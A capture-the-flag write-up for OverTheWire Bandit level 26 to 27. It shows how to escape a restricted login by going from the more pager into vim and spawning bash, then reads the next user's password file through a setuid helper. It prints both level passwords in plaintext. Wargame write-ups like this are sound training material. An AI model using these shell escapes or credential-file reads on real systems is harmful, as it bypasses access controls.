# Bandit Level 26 to 27

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Bandit |
| Level | 26 -> 27 |
| Status | Complete |

## Objective

Use the `bandit27-do` setuid helper from inside the restricted `bandit26` environment.

## Given Access

User: `bandit26`

Password:

```text
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

## Method

Enter `vim` through the `more` escape, set the shell to `/bin/bash`, spawn a shell, then run the helper to read `bandit27`'s password file.

## Commands

```vim
:set shell=/bin/bash
:shell
```

```bash
whoami
ls -la
./bandit27-do cat /etc/bandit_pass/bandit27
```

## Result

Password for `bandit27`:

```text
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

## Lesson

Once an editor escape provides a real shell, local setuid helpers work normally. The restriction was on the login path, not on command execution after escape.

## References

- https://overthewire.org/wargames/bandit/
